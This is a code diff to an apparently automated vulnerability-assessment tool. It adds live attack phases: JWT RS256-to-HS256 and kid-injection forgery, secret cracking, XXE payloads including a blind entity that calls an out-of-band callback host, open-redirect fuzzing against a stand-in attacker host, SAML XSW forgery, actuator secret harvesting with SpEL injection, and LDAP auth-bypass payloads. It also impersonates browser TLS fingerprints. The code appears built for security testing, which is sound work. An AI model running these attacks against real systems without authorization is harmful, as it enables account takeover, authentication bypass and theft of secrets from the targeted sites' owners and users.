@@ -7693,6 +7693,33 @@ def run_post_param_discovery(domain: str,
 
 
 # ── NEW: JWT Audit ──────────────────────────────────────────────────────────────
+
+def _check_waf_block(findings_dir: str, url: str, response, already_recorded: bool) -> bool:
+    """Fix Round 3 (Critical #2): shared bot-management/WAF-block coverage
+    check for every Task-9 phase issuing live requests via
+    tls_impersonation.get_client(...). tls_impersonation.detect_bot_management
+    / record_waf_block were fully implemented and tested (Task 2) but never
+    called anywhere — a phase silently reporting zero findings after a
+    Cloudflare/Akamai/F5 403/429/503 mid-scan is indistinguishable from a
+    genuinely clean target without this.
+
+    Recorded at MOST ONCE per phase (threaded via the `already_recorded`
+    flag callers pass back in on every call) -- the goal is operator
+    visibility into "this phase got blocked", not an exhaustive per-request
+    WAF fingerprint log. `response` may be None (a module's result object
+    doesn't always carry the raw HTTP response) -- degrades to a no-op.
+    Returns the (possibly updated) already_recorded flag for the caller to
+    thread through its loop."""
+    if already_recorded or response is None:
+        return already_recorded
+    import tls_impersonation
+    product = tls_impersonation.detect_bot_management(response)
+    if product:
+        tls_impersonation.record_waf_block(findings_dir, url, product)
+        return True
+    return already_recorded
+
+
 def run_jwt_audit(domain: str) -> bool:
     """
     Collect JWTs from recon artifacts and run jwt_tool:
@@ -7783,6 +7810,22 @@ def run_jwt_audit(domain: str) -> bool:
         )
         results.append(f"## RS256→HS256 confusion\n{out3}\n")
 
+        # jwt_kid_injection: real JWKS-sourced key confusion + kid injection +
+        # live-replay confirmation (extends the jwt_tool-only coverage above).
+        import jwt_kid_injection
+        import tls_impersonation
+        jwt_client = tls_impersonation.get_client(fingerprint="chrome124")
+        issuer_guess = f"https://{domain}"
+        jwks_keys = jwt_kid_injection.discover_jwks(jwt_client, issuer_guess)
+        if jwks_keys:
+            forged = jwt_kid_injection.try_rs256_to_hs256(token, jwks_keys)
+            if forged:
+                results.append(f"## JWKS-sourced RS256->HS256 forged token\n{forged}\n")
+                log("info", f"JWT {i+1}: JWKS-sourced HS256-confusion token forged — replay against a live endpoint to confirm")
+        kid_candidates = jwt_kid_injection.build_kid_injection_candidates(token)
+        if kid_candidates:
+            results.append(f"## kid-header injection candidates\n{kid_candidates}\n")
+
         # Weak secret crack
         if jwt_wordlist:
             ok4, out4 = run_cmd(
@@ -7794,6 +7837,18 @@ def run_jwt_audit(domain: str) -> bool:
             results.append(f"## Secret crack\n{out4}\n")
             if "SECRET FOUND" in out4 or "secret found" in out4.lower():
                 log("crit", f"JWT {i+1}: WEAK SECRET CRACKED!")
+                # A cracked signing secret is EMPIRICALLY confirmed (jwt_tool
+                # brute-forced the real HS256 key), unlike the alg=none/kid
+                # forge candidates which only prove local generation. Emit it as
+                # a structured finding to the canonical jwt/jwt_confirmed.txt so
+                # it survives the reporter's exemption of the per-token narrative
+                # dumps (jwt_<N>*.txt); the `CONFIRMED` keyword scores CRITICAL.
+                confirmed_file = os.path.join(jwt_dir, "jwt_confirmed.txt")
+                with open(confirmed_file, "a") as cf:
+                    cf.write(
+                        f"[JWT-WEAK-SECRET-CONFIRMED] token={token[:60]}... "
+                        f"source={source} :: jwt_tool -C brute-forced the HS256 signing secret\n"
+                    )
 
         with open(result_file, "w") as f:
             f.write("\n".join(results))
@@ -7805,6 +7860,613 @@ def run_jwt_audit(domain: str) -> bool:
         detail=f"target={domain} tokens={len(found_jwts)}",
         artifacts={"jwt": jwt_dir},
     )
+    return True
+
+
+def run_xxe_hunt(domain: str) -> bool:
+    """XXE probing: content-type swap (always) + blind-OOB confirmation via a
+    spawned interactsh session (whenever the binary/token is available) +
+    upload-vector probing (only when scanner.sh's own upload-candidate
+    discovery — findings/upload/active_upload_probe.txt — found something;
+    this module has no independent upload-endpoint discovery of its own)."""
+    import xxe_hunt
+    import tls_impersonation
+    import interactsh_client
+
+    log("phase", f"XXE HUNT: {domain}")
+    findings_dir = _resolve_findings_dir(domain, create=True)
+    xxe_dir = os.path.join(findings_dir, "xxe")
+    os.makedirs(xxe_dir, exist_ok=True)
+    if _brain and _brain.enabled:
+        _brain.phase_start("XXE HUNT", f"target={domain}")
+
+    urls_file = os.path.join(_resolve_recon_dir(domain), "urls", "with_params.txt")
+    if not os.path.isfile(urls_file):
+        _brain_phase_complete("XXE HUNT", False, detail=f"target={domain} no urls with params")
+        return False
+
+    client = tls_impersonation.get_client(fingerprint=tls_impersonation.select_fingerprint(domain))
+    session = interactsh_client.spawn(log_dir=xxe_dir)
+
+    confirmed, candidates = 0, 0
+    out_path = os.path.join(xxe_dir, "findings.txt")
+    oob_sent = 0
+    waf_recorded = False
+    for url in _collect_urls_from_file(urls_file, strip_query=False, limit=100):
+        result = xxe_hunt.probe_content_type_swap(client, url, {})
+        waf_recorded = _check_waf_block(findings_dir, url, result.response, waf_recorded)
+        if result.verdict == "confirmed":
+            confirmed += 1
+            with open(out_path, "a") as f:
+                f.write(f"[XXE-CONFIRMED] {url} | {result.evidence}\n")
+        elif result.verdict == "candidate":
+            candidates += 1
+            with open(out_path, "a") as f:
+                f.write(f"[XXE-CANDIDATE] {url} | {result.evidence}\n")
+
+        # Blind-OOB variant: probe_content_type_swap (above) only ever sends
+        # the fixed in-band file:///etc/passwd payload, so a target that
+        # resolves the external entity but never reflects its content back
+        # (the classic blind-XXE case) is invisible to it. Send a second,
+        # separate content-type-swap request per URL with an entity pointing
+        # at THIS session's real, interactsh-issued canary domain
+        # (session.url) instead. session.token is only ever non-empty when
+        # interactsh-client actually confirmed a correlation domain from its
+        # own startup banner (see interactsh_client.spawn's docstring) — an
+        # empty token means "no real OOB channel available", not "match
+        # everything", so it must gate this block.
+        if session is not None and session.token:
+            oob_payload = (
+                '<?xml version="1.0"?>'
+                f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{session.url}/xxe-callback">]>'
+                "<root>&xxe;</root>"
+            )
+            oob_response = client.post(url, headers={"Content-Type": "application/xml"}, data=oob_payload)
+            waf_recorded = _check_waf_block(findings_dir, url, oob_response, waf_recorded)
+            oob_sent += 1
+
+    if session is not None and session.token and oob_sent:
+        # interactsh-client assigns ONE correlation domain per spawned session
+        # (not one per HTTP request), so a callback proves at least one of the
+        # oob_sent URLs resolved the external entity out-of-band — the same
+        # coarse, whole-batch attribution hunt.py's existing Log4Shell OOB step
+        # (run_rce_scan, ~line 5850) already relies on for the identical reason.
+        log("info", f"XXE: waiting for blind-OOB callback(s) ({oob_sent} URL(s) probed)...")
+        time.sleep(8)
+        oob_result = xxe_hunt.confirm_blind_oob(session, session.token)
+        if oob_result.verdict == "confirmed":
+            confirmed += 1
+            with open(out_path, "a") as f:
+                f.write(f"[XXE-OOB-CONFIRMED] {oob_sent} URL(s) probed via {session.url} | {oob_result.evidence}\n")
+
+    # Upload-vector XXE: only run against endpoints scanner.sh's own upload
+    # discovery (Check "upload" → findings/upload/active_upload_probe.txt) has
+    # already found. This module does not implement its own upload-endpoint
+    # discovery — fabricating one here would violate this codebase's
+    # anti-fabrication discipline, so we degrade gracefully instead.
+    upload_candidates_file = os.path.join(findings_dir, "upload", "active_upload_probe.txt")
+    upload_urls: list[str] = []
+    if os.path.isfile(upload_candidates_file):
+        seen_upload: set[str] = set()
+        with open(upload_candidates_file, errors="ignore") as f:
+            for line in f:
+                tokens = line.split()
+                if len(tokens) > 1 and tokens[1].startswith(("http://", "https://")) and tokens[1] not in seen_upload:
+                    seen_upload.add(tokens[1])
+                    upload_urls.append(tokens[1])
+
+    upload_probed = 0
+    if upload_urls:
+        for endpoint in upload_urls[:20]:
+            upload_result = xxe_hunt.probe_upload_xxe(client, endpoint, doc_type="svg")
+            waf_recorded = _check_waf_block(findings_dir, endpoint, upload_result.response, waf_recorded)
+            upload_probed += 1
+            if upload_result.verdict == "confirmed":
+                confirmed += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[XXE-UPLOAD-CONFIRMED] {endpoint} | {upload_result.evidence}\n")
+            elif upload_result.verdict == "candidate":
+                candidates += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[XXE-UPLOAD-CANDIDATE] {endpoint} | {upload_result.evidence}\n")
+    else:
+        log("info", "XXE hunt: no discovered upload endpoints "
+                     "(findings/upload/active_upload_probe.txt missing/empty, or scanner.sh's "
+                     "upload check was skipped) — upload-vector XXE skipped")
+
+    if session is not None:
+        session.stop()
+
+    _brain_phase_complete("XXE HUNT", True,
+                           detail=(f"target={domain} confirmed={confirmed} candidates={candidates} "
+                                   f"oob_probed={oob_sent} upload_probed={upload_probed}"),
+                           artifacts={"xxe": xxe_dir})
+    return True
+
+
+def run_open_redirect_hunt(domain: str) -> bool:
+    """Generic parametric open-redirect fuzzing."""
+    import open_redirect_hunt
+    import tls_impersonation
+
+    log("phase", f"OPEN REDIRECT HUNT: {domain}")
+    findings_dir = _resolve_findings_dir(domain, create=True)
+    redirects_dir = os.path.join(findings_dir, "redirects")
+    os.makedirs(redirects_dir, exist_ok=True)
+    if _brain and _brain.enabled:
+        _brain.phase_start("OPEN REDIRECT HUNT", f"target={domain}")
+
+    urls_file = os.path.join(_resolve_recon_dir(domain), "urls", "with_params.txt")
+    if not os.path.isfile(urls_file):
+        _brain_phase_complete("OPEN REDIRECT HUNT", False, detail=f"target={domain} no urls with params")
+        return False
+
+    client = tls_impersonation.get_client(fingerprint=tls_impersonation.select_fingerprint(domain))
+    attacker_host = os.environ.get("VAPT_REDIRECT_CANARY_HOST", "burpcollaborator.example")
+
+    confirmed = 0
+    out_path = os.path.join(redirects_dir, "findings.txt")
+    waf_recorded = False
+    for url in _collect_urls_from_file(urls_file, strip_query=False, limit=200):
+        for param in open_redirect_hunt.extract_redirect_params(url):
+            result = open_redirect_hunt.probe_url(client, url, param, attacker_host)
+            waf_recorded = _check_waf_block(findings_dir, url, result.response, waf_recorded)
+            if result.confirmed:
+                confirmed += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[OPEN-REDIRECT-CONFIRMED] {url} | param={param} | location={result.location}\n")
+
+    _brain_phase_complete("OPEN REDIRECT HUNT", True,
+                           detail=f"target={domain} confirmed={confirmed}",
+                           artifacts={"redirects": redirects_dir})
+    return True
+
+
+def run_saml_xsw(domain: str) -> bool:
+    """SAML XSW1-8 forgery — requires an operator-supplied captured SAMLResponse."""
+    import base64
+    import saml_xsw_tester
+    import tls_impersonation
+
+    log("phase", f"SAML XSW: {domain}")
+    findings_dir = _resolve_findings_dir(domain, create=True)
+    saml_dir = os.path.join(findings_dir, "saml")
+    endpoints_file = os.path.join(saml_dir, "endpoints.txt")
+    if not os.path.isfile(endpoints_file):
+        _brain_phase_complete("SAML XSW", False, detail=f"target={domain} Check 7 has not run yet")
+        return False
+    if _brain and _brain.enabled:
+        _brain.phase_start("SAML XSW", f"target={domain}")
+
+    captured_path = os.environ.get("VAPT_SAML_CAPTURED_RESPONSE", "")
+    assertion_xml = saml_xsw_tester.load_captured_assertion(captured_path) if captured_path else None
+    if assertion_xml is None:
+        log("info", "SAML XSW: no captured SAMLResponse supplied (VAPT_SAML_CAPTURED_RESPONSE) — "
+                     "skipping forgery, manual capture required")
+        _brain_phase_complete("SAML XSW", True, detail=f"target={domain} skipped: no captured assertion")
+        return True
+
+    # Pick the real ACS/login endpoint out of everything Check 7 discovered
+    # (endpoints.txt also holds /saml/metadata, /adfs/ls, /sso/saml, etc.) —
+    # mirrors scanner.sh's own ACS_URL selection (Check 7:
+    # `grep "saml/acs\|saml/login"`) instead of blindly taking the 2nd
+    # whitespace token of the WHOLE file, which picked whichever endpoint
+    # scanner.sh happened to discover first (not necessarily the real ACS).
+    _acs_marker_re = re.compile(r"(?i)saml/acs|saml/login")
+    acs_url = ""
+    with open(endpoints_file, errors="ignore") as f:
+        for line in f:
+            if _acs_marker_re.search(line):
+                tokens = line.split()
+                if len(tokens) > 1:
+                    acs_url = tokens[1]
+                break
+    if not acs_url:
+        log("info", "SAML XSW: no ACS/login-shaped endpoint discovered by scanner.sh Check 7 — "
+                     "skipping forgery (would otherwise forge against an unrelated SAML endpoint)")
+        _brain_phase_complete("SAML XSW", True, detail=f"target={domain} skipped: no ACS/login endpoint discovered")
+        return True
+
+    client = tls_impersonation.get_client(fingerprint="chrome124")
+    # An empty resource_url is tolerated here (not an early skip): the loop
+    # still lets WAF-block detection observe each ACS response, and
+    # confirm_new_session itself guards the empty-URL case rather than calling
+    # client.get("") (which would raise in the real HTTP client).
+    resource_url = os.environ.get("VAPT_SAML_PROTECTED_RESOURCE", "")
+
+    confirmed_variants = []
+    waf_recorded = False
+    for name, xml in saml_xsw_tester.generate_xsw_variants(assertion_xml).items():
+        forged_b64 = base64.b64encode(xml.encode()).decode()
+        result = saml_xsw_tester.confirm_new_session(client, acs_url, forged_b64, resource_url)
+        waf_recorded = _check_waf_block(findings_dir, acs_url, result.response, waf_recorded)
+        if result.confirmed:
+            confirmed_variants.append(name)
+
+    out_path = os.path.join(saml_dir, "xsw_findings.txt")
+    with open(out_path, "a") as f:
+        for name in confirmed_variants:
+            f.write(f"[SAML-XSW-CONFIRMED] variant={name}\n")
+
+    _brain_phase_complete("SAML XSW", True,
+                           detail=f"target={domain} confirmed_variants={confirmed_variants}",
+                           artifacts={"saml": saml_dir})
+    return True
+
+
+def run_actuator_probe(domain: str) -> bool:
+    """SpEL oracle + Jolokia reachability + actuator/env secret parsing."""
+    import springboot_actuator_probe
+    import tls_impersonation
+
+    log("phase", f"ACTUATOR PROBE: {domain}")
+    findings_dir = _resolve_findings_dir(domain, create=True)
+    exposure_file = os.path.join(_resolve_recon_dir(domain), "urls", "sensitive_paths.txt")
+    if not os.path.isfile(exposure_file):
+        _brain_phase_complete("ACTUATOR PROBE", False, detail=f"target={domain} no recon.sh Phase 9 output")
+        return False
+    if _brain and _brain.enabled:
+        _brain.phase_start("ACTUATOR PROBE", f"target={domain}")
+
+    client = tls_impersonation.get_client(fingerprint="chrome124")
+    actuator_urls = [line.strip() for line in open(exposure_file) if "actuator" in line or "jolokia" in line]
+
+    out_dir = os.path.join(findings_dir, "actuator")
+    os.makedirs(out_dir, exist_ok=True)
+    out_path = os.path.join(out_dir, "findings.txt")
+    confirmed = candidates = jolokia_reachable = 0
+    waf_recorded = False
+
+    for url in actuator_urls:
+        if "jolokia" in url.lower():
+            # Jolokia's MBean-listing endpoint is a JMX-over-HTTP bridge, not a
+            # Spring-SpEL sink — check_spel_injection's ?expr= probe is
+            # meaningless against it. check_jolokia_reachability proves the RCE
+            # PRECONDITION (Jolokia reachable + MBeans listable) without
+            # executing anything, so it is logged as an info-severity coverage
+            # note and never auto-escalated to a confirmed/candidate finding
+            # on its own.
+            jolokia_result = springboot_actuator_probe.check_jolokia_reachability(client, url)
+            waf_recorded = _check_waf_block(findings_dir, url, jolokia_result.response, waf_recorded)
+            if jolokia_result.reachable:
+                jolokia_reachable += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[JOLOKIA-REACHABLE] {url} | mbean_count={jolokia_result.mbean_count}\n")
+            continue
+
+        if "env" in url:
+            resp = client.get(url)
+            waf_recorded = _check_waf_block(findings_dir, url, resp, waf_recorded)
+            try:
+                secrets = springboot_actuator_probe.parse_actuator_env_secrets(resp.json())
+            except Exception:
+                secrets = []
+            for hit in secrets:
+                confirmed += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[ACTUATOR-ENV-SECRET-CONFIRMED] {url} | {hit}\n")
+        spel_result = springboot_actuator_probe.check_spel_injection(client, url)
+        waf_recorded = _check_waf_block(findings_dir, url, spel_result.response, waf_recorded)
+        if spel_result.verdict == "confirmed":
+            confirmed += 1
+            with open(out_path, "a") as f:
+                f.write(f"[SPEL-CONFIRMED] {url} | {spel_result.detail}\n")
+        elif spel_result.verdict == "candidate":
+            candidates += 1
+            with open(out_path, "a") as f:
+                f.write(f"[SPEL-CANDIDATE] {url} | {spel_result.detail}\n")
+
+    _brain_phase_complete("ACTUATOR PROBE", True,
+                           detail=(f"target={domain} confirmed={confirmed} candidates={candidates} "
+                                   f"jolokia_reachable={jolokia_reachable}"),
+                           artifacts={"actuator": out_dir})
+    return True
+
+
+# RFC 4515 auth-failure shapes a login/search endpoint typically renders when
+# the query legitimately fails. Mirrors har_vapt_engine._is_success_response's
+# negative-marker list (same idea, applied to an HTML login response instead
+# of a JSON API body) — used below so an always-true bypass payload's response
+# has to affirmatively look UN-failed, not merely differ from the baseline.
+_LDAP_AUTH_FAILURE_MARKERS = (
+    "invalid session", "invalid_session", "session expired", "not authenticated",
+    "authentication required", "unauthorized", "please log in", "please login",
+    "invalid credentials", "login failed", "access denied", "incorrect password",
+)
+
+# Fix Round 3 (Critical #1): a bare "a Set-Cookie header appeared that wasn't
+# on the baseline" is gameable by ANY unrelated cookie a page happens to set —
+# a Google Analytics _ga cookie, a CSRF token minted fresh on every page load
+# including a failed login, etc. Explicit reject-list checked FIRST (a name
+# match here means "definitely not session evidence", full stop, even though
+# some of these substrings — e.g. "token" in XSRF-TOKEN — would otherwise also
+# match the session-shaped marker list below).
+_LDAP_NON_AUTH_COOKIE_NAME_MARKERS = (
+    "_ga", "_gid", "_gat", "_fbp", "_fbc", "csrftoken", "csrf-token", "csrf_token",
+    "xsrf-token", "xsrf_token",
+)
+# Session/auth-cookie-shaped name markers (case-insensitive substring match).
+# Covers JSESSIONID, PHPSESSID, ASP.NET_SessionId (all contain "sess"), plus
+# generic "sid"/"auth"/"token"-named session cookies.
+_LDAP_SESSION_COOKIE_NAME_MARKERS = ("sess", "sid", "auth", "token")
+
+
+def _ldap_looks_like_session_cookie(name: str) -> bool:
+    """True only for cookie names that plausibly carry session/auth state.
+
+    Explicitly rejects known analytics/CSRF cookie names FIRST — a CSRF token
+    is minted on every page load, including a failed one, and an analytics
+    cookie has nothing to do with auth state, so neither is evidence of a new
+    session regardless of whether its name also happens to contain a
+    session-shaped substring (e.g. "token" in XSRF-TOKEN)."""
+    lname = name.lower()
+    if any(marker in lname for marker in _LDAP_NON_AUTH_COOKIE_NAME_MARKERS):
+        return False
+    return any(marker in lname for marker in _LDAP_SESSION_COOKIE_NAME_MARKERS)
+
+
+def _ldap_response_looks_like_failure(response) -> bool:
+    """Same un-failed shape check _ldap_bypass_verdict applies to the initial
+    bypass response, reused to sanity-check the verification follow-up."""
+    text = (response.text or "").lower()
+    if response.status_code >= 400 or response.status_code in (301, 302, 303, 307, 308):
+        return True
+    return any(marker in text for marker in _LDAP_AUTH_FAILURE_MARKERS)
+
+
+def _ldap_set_cookie_pairs(headers) -> dict:
+    """Parse the Set-Cookie header value into {cookie_name: cookie_value}.
+    Mirrors the module's existing single-Set-Cookie assumption (dict(headers)
+    collapses duplicate header keys) — enough to detect a NEW or value-CHANGED
+    session cookie between the baseline and the injection response. The name is
+    returned in its real case so it can be replayed verbatim in the follow-up."""
+    raw = dict(headers).get("Set-Cookie")
+    if not raw:
+        return {}
+    name, _, value = raw.split(";")[0].partition("=")
+    name = name.strip()
+    return {name: value} if name else {}
+
+
+_LDAP_DIVERGENCE_MIN_BYTES = 256
+_LDAP_DIVERGENCE_MIN_RATIO = 0.15
+
+
+def _ldap_responses_diverge(response, control) -> bool:
+    """True when the WITH-cookie response differs from the no-cookie control in an
+    authentication-MEANINGFUL way. Deliberately NOT byte-for-byte inequality:
+    any page carrying a per-request CSRF token / timestamp / nonce differs
+    between two fetches even when nothing was authenticated, which would let a
+    benign ROTATED session cookie fake a bypass on every dynamic page (moving the
+    old gameable gap rather than closing it). Accept only:
+      - a status-code change (e.g. login/redirect/401 -> 200 authed),
+      - a failure->non-failure flip (the cookie turned a failed control into a
+        non-failure response), or
+      - a body-size delta well beyond per-request token churn (an authenticated
+        view differs from a login/search page by far more than a rotated token).
+    Favours "candidate" over a false "confirmed" when the divergence is small —
+    the correct bias for a fabrication-averse tool."""
+    if response.status_code != control.status_code:
+        return True
+    if _ldap_response_looks_like_failure(control) and not _ldap_response_looks_like_failure(response):
+        return True
+    a = response.text or ""
+    b = control.text or ""
+    larger = max(len(a), len(b))
+    if larger == 0:
+        return False
+    delta = abs(len(a) - len(b))
+    return delta >= _LDAP_DIVERGENCE_MIN_BYTES and (delta / larger) >= _LDAP_DIVERGENCE_MIN_RATIO
+
+
+def _ldap_bypass_verdict(client, url: str, response, baseline) -> str:
+    """Classify an always-true LDAP filter-injection payload's response
+    against the known-probe baseline as "confirmed", "candidate", or "clean".
+
+    A response merely DIFFERING from baseline (ldap_injection_tester's own
+    ``_looks_different_from``) is not proof of an auth bypass — that is what
+    the RFC 4515 fuzz leads above already surface. An always-true payload's
+    entire point is to make an authentication/search that normally FAILS
+    appear to SUCCEED, so this requires the baseline to actually look like a
+    failure first — mirrors nomore403_audit.calibrate_hits, which only counts
+    a 2xx flip as a bypass when the baseline itself looked forbidden (401/403),
+    and deliberately excludes redirects as ambiguous (no -r, no reliable
+    Location signal, same reasoning nomore403_audit documents for its own
+    30x exclusion).
+
+    Tiering (never auto-confirm on a weak signal alone). A Set-Cookie header is
+    NOT, by itself, proof — an unrelated analytics/CSRF cookie set on every page
+    load (failed or not) would satisfy that trivially. This mirrors
+    saml_xsw_tester.confirm_new_session's discipline: never trust a bare
+    Set-Cookie; REPLAY the candidate cookie and only confirm on a genuinely
+    authenticated-looking result. There is no equivalent "protected resource"
+    for a login/search endpoint, so the follow-up re-fetches the SAME `url`.
+
+    Fix Round 4 closed two opposite gaps in the earlier "new cookie the baseline
+    didn't have + follow-up isn't failure-shaped" rule:
+      * It gated the new-session test on the baseline having had NO cookie, which
+        made "confirmed" unreachable whenever the baseline set any cookie
+        (near-universal). Now we compare the session cookie's VALUE: a new OR
+        value-CHANGED session-shaped cookie qualifies, regardless of whether the
+        baseline also set one.
+      * "follow-up isn't failure-shaped" was gameable — a bare login/search page
+        is never failure-shaped, so ANY session-shaped cookie a visitor happens
+        to get passed. Now the WITH-cookie follow-up must materially DIVERGE from
+        a no-cookie CONTROL fetch of the same url (a benign cookie yields an
+        identical page either way).
+      - "confirmed" — response looks un-failed AND a session/auth-shaped cookie
+        was issued whose VALUE is new or changed vs the baseline (not a known
+        analytics/CSRF cookie) AND re-fetching `url` WITH that cookie both looks
+        un-failed AND materially diverges from a no-cookie control of `url`.
+      - "candidate" — response looks un-failed (2xx, no failure markers) but
+        without corroborating VERIFIED session evidence (no new/changed session
+        cookie, a non-session-shaped/reject-listed cookie name, a follow-up that
+        still looks failed, or a follow-up indistinguishable from the no-cookie
+        control) — a real lead, not proof.
+      - "clean" — baseline didn't look like a failure to begin with (nothing
+        to bypass), or the response still looks like a failure/error/redirect.
+    """
+    baseline_text = (baseline.text or "").lower()
+    response_text = (response.text or "").lower()
+
+    baseline_looks_failed = (
+        baseline.status_code in (401, 403)
+        or any(marker in baseline_text for marker in _LDAP_AUTH_FAILURE_MARKERS)
+    )
+    if not baseline_looks_failed:
+        return "clean"
+
+    if response.status_code >= 400 or response.status_code in (301, 302, 303, 307, 308):
+        return "clean"
+    if any(marker in response_text for marker in _LDAP_AUTH_FAILURE_MARKERS):
+        return "clean"
+
+    # A "new session" requires a Set-Cookie on the injection response whose NAME
+    # looks session/auth-shaped (not a known analytics/CSRF cookie) AND whose
+    # VALUE is genuinely new or CHANGED vs the baseline. Fix Round 4: compare the
+    # cookie VALUE rather than gating on "the baseline had zero cookies" — that
+    # earlier gate made "confirmed" UNREACHABLE the moment the baseline set any
+    # cookie at all, which is near-universal (session/CSRF cookies are handed out
+    # on unauthenticated GETs everywhere).
+    baseline_cookies = _ldap_set_cookie_pairs(baseline.headers)
+    response_cookies = _ldap_set_cookie_pairs(response.headers)
+    new_session = None
+    for name, value in response_cookies.items():
+        if not _ldap_looks_like_session_cookie(name):
+            # A known non-auth cookie (analytics/CSRF — never counted as signal)
+            # or an ambiguous name that doesn't look session-shaped either way.
+            continue
+        if baseline_cookies.get(name) == value:
+            # Identical session cookie the baseline already carried — a cookie
+            # every visitor receives, not evidence of a NEW authenticated session.
+            continue
+        new_session = (name, value)
+        break
+    if new_session is None:
+        # Response looked un-failed but there is no corroborating new/changed
+        # session cookie — a real lead, not verified proof.
+        return "candidate"
+
+    # A session-shaped, value-changed cookie is necessary but NOT sufficient.
+    # Prove it actually grants access: (1) re-fetch the SAME login/search url
+    # WITH it attached and require a non-failure-shaped response, AND (2) require
+    # that response to materially DIVERGE from a no-cookie control of the same
+    # url. Fix Round 4: the divergence-vs-control check closes the gap where any
+    # session-shaped cookie passed merely because a bare login page is never
+    # failure-shaped — a benign session cookie every visitor gets yields the
+    # SAME page with or without it. cookies={} is keyed by cookie NAME -> value
+    # (httpx/requests/curl_cffi build the Cookie header verbatim from dict keys),
+    # so the name/value are already split apart in `new_session`.
+    cookie_name, cookie_value = new_session
+    with_cookie = client.get(url, cookies={cookie_name: cookie_value})
+    if _ldap_response_looks_like_failure(with_cookie):
+        return "candidate"
+    control = client.get(url)  # same url, NO injected cookie
+    if not _ldap_responses_diverge(with_cookie, control):
+        return "candidate"
+
+    return "confirmed"
+
+
+def run_ldap_injection(domain: str) -> bool:
+    """RFC 4515 fuzz + blind oracle + always-true auth-bypass payloads —
+    gated on stack fingerprint."""
+    import ldap_injection_tester
+    import tls_impersonation
+    import cve as cve_module  # cve.py::detect_technologies is the existing, real
+                               # tech-fingerprint source (parses httpx_full.txt's
+                               # tech-detect bracket field + attack_surface.json
+                               # tech_clusters) — there is no separate fingerprint-
+                               # tag helper in hunt.py itself.
+
+    log("phase", f"LDAP INJECTION: {domain}")
+    recon_dir = _resolve_recon_dir(domain)
+    techs = cve_module.detect_technologies(domain, recon_dir=recon_dir)
+    fingerprint_tags = {name.lower() for name in techs.keys()}
+    if not ldap_injection_tester.looks_like_ldap_backed_auth(fingerprint_tags):
+        log("info", "LDAP injection: stack fingerprint does not suggest LDAP-backed auth — skipping")
+        _brain_phase_complete("LDAP INJECTION", True,
+                               detail=f"target={domain} skipped: stack fingerprint does not suggest LDAP-backed auth")
+        return True
+    if _brain and _brain.enabled:
+        _brain.phase_start("LDAP INJECTION", f"target={domain}")
+
+    findings_dir = _resolve_findings_dir(domain, create=True)
+    ldap_dir = os.path.join(findings_dir, "ldap")
+    os.makedirs(ldap_dir, exist_ok=True)
+
+    # There is no dedicated login-form recon file (login-path detection today
+    # only happens in-process inside vikramaditya.py's fingerprint_webapp, not
+    # persisted for hunt.py to read) — filter the real urls/all.txt crawl output
+    # for login-shaped paths instead, same approach _authz_select_pages already
+    # uses for its own path filtering.
+    all_urls_file = os.path.join(_resolve_recon_dir(domain), "urls", "all.txt")
+    if not os.path.isfile(all_urls_file):
+        _brain_phase_complete("LDAP INJECTION", False, detail=f"target={domain} no urls/all.txt from recon")
+        return False
+
+    _LOGIN_PATH_MARKERS = ("login", "signin", "sign-in", "sso", "auth")
+    login_urls = [
+        u for u in _collect_urls_from_file(all_urls_file, strip_query=False, limit=2000)
+        if any(marker in u.lower() for marker in _LOGIN_PATH_MARKERS)
+    ][:20]
+
+    client = tls_impersonation.get_client(fingerprint="chrome124")
+    param = "q"
+    confirmed = 0
+    fuzz_candidates = 0
+    bypass_confirmed = 0
+    bypass_candidates = 0
+    out_path = os.path.join(ldap_dir, "findings.txt")
+    waf_recorded = False
+    for url in login_urls:
+        baseline = client.get(url, params={param: "baseline_probe_value"})
+        waf_recorded = _check_waf_block(findings_dir, url, baseline, waf_recorded)
+
+        result = ldap_injection_tester.run_blind_oracle(client, url, param, baseline)
+        if result.confirmed:
+            confirmed += 1
+            with open(out_path, "a") as f:
+                f.write(f"[LDAP-INJECTION-CONFIRMED] {url} | {result.detail}\n")
+
+        # RFC 4515 fuzz: an unescaped special character reaching the filter is
+        # the signal this builder is FOR, but a single differing response only
+        # proves "the character reached the filter unescaped" — not
+        # exploitability — so this is always a lead, never an auto-confirm.
+        for payload in ldap_injection_tester.build_rfc4515_fuzz_payloads():
+            fuzz_response = client.get(url, params={param: payload})
+            waf_recorded = _check_waf_block(findings_dir, url, fuzz_response, waf_recorded)
+            if ldap_injection_tester._looks_different_from(fuzz_response, baseline):
+                fuzz_candidates += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[LDAP-FUZZ-CANDIDATE] {url} | payload={payload!r} "
+                            f"response diverged from baseline (status {baseline.status_code} "
+                            f"-> {fuzz_response.status_code})\n")
+
+        # Always-true bypass payloads: the point is the login/search should
+        # appear to SUCCEED where the baseline failed -- see
+        # _ldap_bypass_verdict's docstring for the confirmed/candidate tiering.
+        for payload in ldap_injection_tester.build_always_true_bypass_payloads(param):
+            bypass_response = client.get(url, params={param: payload})
+            waf_recorded = _check_waf_block(findings_dir, url, bypass_response, waf_recorded)
+            verdict = _ldap_bypass_verdict(client, url, bypass_response, baseline)
+            if verdict == "confirmed":
+                bypass_confirmed += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[LDAP-BYPASS-CONFIRMED] {url} | payload={payload!r} "
+                            f"new session issued on an always-true filter injection\n")
+            elif verdict == "candidate":
+                bypass_candidates += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[LDAP-BYPASS-CANDIDATE] {url} | payload={payload!r} "
+                            f"baseline looked like a failed auth, response did not\n")
+
+    _brain_phase_complete("LDAP INJECTION", True,
+                           detail=(f"target={domain} confirmed={confirmed} "
+                                   f"fuzz_candidates={fuzz_candidates} "
+                                   f"bypass_confirmed={bypass_confirmed} "
+                                   f"bypass_candidates={bypass_candidates}"),
+                           artifacts={"ldap": ldap_dir})
     return True
 
 
@@ -8537,6 +9199,58 @@ def hunt_target(
             log("warn", f"nuclei -dast phase errored: {_nd_err}")
             result["nuclei_dast"] = False
 
+    # ── Phase 7.8: XXE hunt (content-type swap + upload vector + blind OOB) ─
+    # Honours the same skip predicate as the vuln scan (active requests).
+    if should_run_vuln_scan and not skip_scan \
+            and not skip_has(skip_items, "scan", "vuln_scan", "xxe_hunt"):
+        try:
